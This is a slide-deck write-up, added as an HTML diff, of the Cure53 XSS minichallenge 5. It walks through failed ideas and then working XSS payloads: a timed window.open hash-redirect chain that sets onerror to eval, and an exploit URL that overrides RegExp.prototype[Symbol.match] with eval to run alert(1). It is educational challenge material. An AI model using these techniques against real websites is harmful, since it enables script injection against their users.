@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS minichallenge 5</title>
+    <link rel="stylesheet" href="../lib/reveal/css/reveal.css">
+    <link rel="stylesheet" href="../lib/reveal/css/theme/black.css">
+    <script src="../lib/head/head.min.js"></script>
+    <style>
+        .url-part {
+            text-align: left;
+        }
+        .reveal .screenshot {
+            background-color: white;
+        }
+        .reveal ul code {
+            font-size: 50%;
+            vertical-align: middle;
+        }
+        .reveal code {
+            padding: 3px;
+            border: 1px solid #686868;
+            background-color: #383838;
+        }
+        .reveal .footer {
+            margin-top: 40px;
+            text-align: right;
+            font-size: 50%;
+        }
+    </style>
+</head>
+<body>
+
+<div class="reveal">
+    <div class="slides">
+        <section>
+            <h2>Cure53 xss minichallenge 5</h2>
+            <h4>The XSS Metaphor</h4>
+            <a href="https://html5sec.org/minichallenges/5">https://html5sec.org/minichallenges/5</a>
+            <div class="footer">
+                <p>Writeup by Hegedűs Tamás, 2016.04.</p>
+            </div>
+        </section>
+
+        <section>
+            <img src="assets/challenge-screenshot.png" class="screenshot">
+        </section>
+
+        <section data-transition="fade-out">
+            <div class="url-part">?</div>
+            <pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+onload=onhashchange=func;
+function func(){
+    try{
+        1;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {
+            &quot;/&quot;+u.match(/\\/);
+            location=u;
+        }
+    }catch(e){
+        throw 1;
+    }
+}
+&lt;/script&gt;</code></pre>
+        </section>
+
+        <section data-transition="fade">
+            <div class="url-part">?xss=asdasd</div>
+            <pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+onload=onhashchange=func;
+function func(){
+    try{
+        asdasd;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {
+            &quot;/&quot;+u.match(/\\/);
+            location=u;
+        }
+    }catch(e){
+        throw asdasd;
+    }
+}
+&lt;/script&gt;</code></pre>
+        </section>
+
+
+        <section data-transition="fade">
+            <div class="url-part">?xss=x_-+/*?!;:,.@#$%^&*"'<>()[]{}y</div>
+            <pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+onload=onhashchange=func;
+function func(){
+    try{
+        x          .             []  y;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {
+            &quot;/&quot;+u.match(/\\/);
+            location=u;
+        }
+    }catch(e){
+        throw x          .             []  y;
+    }
+}
+&lt;/script&gt;</code></pre>
+        </section>
+
+
+        <section data-transition="fade">
+            <div class="url-part">?xss=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</div>
+            <pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+onload=onhashchange=func;
+function func(){
+    try{
+        ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {
+            &quot;/&quot;+u.match(/\\/);
+            location=u;
+        }
+    }catch(e){
+        throw ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789;
+    }
+}
+&lt;/script&gt;</code></pre>
+        </section>
+
+        <section data-transition="fade">
+            <div class="url-part">?xss=abcdefghijklmnopqrstuvwxyz</div>
+            <pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+onload=onhashchange=func;
+function func(){
+    try{
+        abcdefghijklm opqrstuvwxyz;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {
+            &quot;/&quot;+u.match(/\\/);
+            location=u;
+        }
+    }catch(e){
+        throw abcdefghijklm opqrstuvwxyz;
+    }
+}
+&lt;/script&gt;</code></pre>
+        </section>
+
+        <section data-transition="fade">
+            <div class="url-part">?xss=now what</div>
+            <pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+onload=onhashchange=func;
+function func(){
+    try{
+        now what;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {
+            &quot;/&quot;+u.match(/\\/);
+            location=u;
+        }
+    }catch(e){
+        throw now what;
+    }
+}
+&lt;/script&gt;</code></pre>
+        </section>
+
+        <section>
+            <h3>Idea 0</h3>
+            <p><code>alert<span class="fragment highlight-red" data-fragment-index="1">(</span>1<span class="fragment highlight-red" data-fragment-index="1">)</span></code></p>
+            <pre><code>    try{
+        now what;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {</code></pre>
+            <ul>
+                <li class="fragment"><code>'()'</code> is stripped</li>
+            </ul>
+
+        </section>
+
+        <section>
+            <h3>Idea 1</h3>
+            <p><code>Stri<span class="fragment highlight-red">n</span>g.prototype.match = alert</code></p>
+            <pre><code>    try{
+        now what;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {</code></pre>
+            <ul>
+                <li class="fragment"><code>'n'</code> is stripped</li>
+                <li class="fragment">Wouldn't work anyway as <code>alert</code> must be invoked in <code>window</code> context</li>
+            </ul>
+
+        </section>
+
+        <section>
+            <h3>Idea 2</h3>
+            <p>o<span class="fragment highlight-red">n</span>error = eval; throw 1;</p>
+            <pre><code>    try{
+        now what;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {</code></pre>
+            <ul>
+                <li class="fragment"><code>'n'</code> is still stripped</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Idea 3.1</h3>
+            <p><code>Array.prototype.valueOf=URL</code></p>
+            <pre><code>        Array.prototype.valueOf=URL;
+        u=location.hash.slice(1);
+        if(u.match(/^https?:\/\/cure53.de\//)) {
+            &quot;/&quot;+u.match(/\\/);
+            location=u;</code></pre>
+            <ul>
+                <li class="fragment"><code>""+obj</code> calls <code>obj.valueOf()</code> implicitly</li>
+                <li class="fragment"><code>URL</code> throws if not called with <code>new</code></li>
+                <li class="fragment">got into <code>catch</code> after <code>u</code> has been set</li>
+                <li class="fragment">Other options: <code>Symbol.toPrimitive, toStri<span class="highlight-red">n</span>g</code></li>
+                <li class="fragment">( ... anything else?)</li>
+                <li class="fragment">But having a partially controlled string seems to be still insufficient</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Idea 3.2</h3>
+            <p>Make use of <code>onhashchange=func</code></p>
+            <pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+onload=onhashchange=func;
+function func(){
+    try{</code></pre>
+            <ul>
+                <li class="fragment">Changing the hash fragment of the url does not redirect, js state remains</li>
+                <li class="fragment">We could collect desired strings from the hash one by one</li>
+                <li class="fragment"><code>X-Frame-Options: DENY</code> :'(</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Idea 3.3</h3>
+            <p><code>window.open</code></p>
+            <pre><code>base=&quot;...?xss=...&quot;
+w=window.open(base+&quot;#onerror&quot;);
+w.location=base+&quot;#alert(1)&quot;;</code></pre>
+            <ul>
+                <li class="fragment">Turns out we can redirect our popups, even cross-domain!</li>
+                <li class="fragment">Hey this seems to be working! The page does not reload, only hashchange is fired!</li>
+                <li class="fragment">Now construct an attack with redirects, collect necessary strings to setup <code>onerror=eval</code></li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Idea 3.4</h3>
+            <p>See the steps</p>
+            <pre><code>var xss = "self[[typeof [[[d=self.w][w=self.u]][self[self.u]=eval]"+
+"][Array.prototype.valueOf=URL]][0][2]]";
+w = open(xss + "#onerror");
+w.location = xss + "#Uncaught";
+w.location = xss + "#+alert(1)";
+w.location = xss + "#https://cure53.de/\\";</code></pre>
+            <ul>
+                <li class="fragment">This evals <code>"Uncaught +alert(1)"</code> on Chrome and Edge</li>
+                <li class="fragment"><code>"uncaught exception: +alert(1)"</code> on FF :'(</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Idea 3.5</h3>
+            <p>Real working code &ndash; with timeouts and stuff</p>
+            <pre><code>&lt;script&gt;
+var xss = "self[[typeof [[[d=self.w][w=self.u]][self[self.u]=eval]][Array.prototype.valueOf=URL]][0][2]]",
+hashes = [
+  "#onerror",
+  "#Uncaught",
+  "#+alert(1)",
+  "#https://cure53.de/\\"
+], i=0, w;
+
+function step() {
+  var hash = hashes[i++];
+  if (hash) {
+    var url = "https://html5sec.org/minichallenges/5?xss=" + xss + hash;
+    if (i&gt;1) {
+      w.location = url;
+      setTimeout(step, 100);
+    } else {
+      w = open(url);
+      setTimeout(step, 500);
+    }
+  }
+}
+step();
+&lt;/script&gt;</code></pre>
+        </section>
+
+        <section>
+            <h3>Idea 4</h3>
+            <p><code>Symbol.match</code></p>
+            <ul>
+                <li class="fragment" data-fragment-index="1"><code>str.match(reg)</code> just calls <code>reg[Symbol.match](str)</code></li>
+                <li class="fragment" data-fragment-index="2">-.-</li>
+                <li class="fragment" data-fragment-index="3">exploit: <a href="https://html5sec.org/minichallenges/5?xss=RegExp.prototype[Symbol.match]=eval#alert(1)"><code class="text-sm">"?xss=RegExp.prototype[Symbol.match]=eval#alert(1)"</code></a></li>
+                <li class="fragment" data-fragment-index="5"> ... and this is still not the expected solution!</li>
+            </ul>
+            <pre class="fragment" data-fragment-index="4"><code>try{
+    RegExp.prototype[Symbol.match]=eval;
+    u=location.hash.slice(1);                // u is now "alert(1)"
+    if(u.match(/^https?:\/\/cure53.de\//)) { // DONG</code></pre>
+        </section>
+
+        <section>
+            <div>Curious about what are the expected solutions? See the writeups guys:</div>
+            <a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Mini-Challenge-5">https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Mini-Challenge-5</a>
+            <div>There are some sweet xss there, worth reading.</div>
+            <div>&nbsp;</div>
+            <h3>Thanks</h3>
+        </section>
+    </div>
+</div>
+
+<script src="../lib/reveal/js/reveal.js"></script>
+<script>
+    Reveal.initialize({
+        transition: "convex",
+        history: true,
+        dependencies: [
+            { src: 'lib/reveal/plugin/zoom-js/zoom.js', async: true }
+        ]
+    });
+</script>
+
+</body>
+</html>
